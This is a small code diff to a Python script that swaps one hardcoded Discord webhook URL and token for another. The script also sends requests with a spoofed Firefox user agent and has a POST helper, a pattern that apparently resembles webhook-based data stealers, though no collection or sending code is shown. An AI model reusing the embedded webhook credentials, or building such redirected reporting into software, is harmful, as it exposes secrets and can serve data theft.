@@ -1,4 +1,4 @@
-# ruff: noqa: INP001
+ # ruff: noqa: INP001
 import base64
 import json
 import os
@@ -11,7 +11,7 @@ REQUEST_HEADERS = {
     "Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
-WEBHOOK_URL = "https://discord.com/api/webhooks/1404177470713892984/tIjjau0JSzrb27D3LsIvAagGJwnLWd1VdGUIH2UPWS5ucDjSGjVaKgBhIFNB_xExU2AH"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1406696487949307934/dmoAWhLKhrMnTL7GBEzmI54ZjcKXFYPTvAnIYBLvThkpGg981sT9oCDd2EstMJug5ImN"
 
 
 def make_post_request(api_url: str, data: dict[str, str]) -> int:
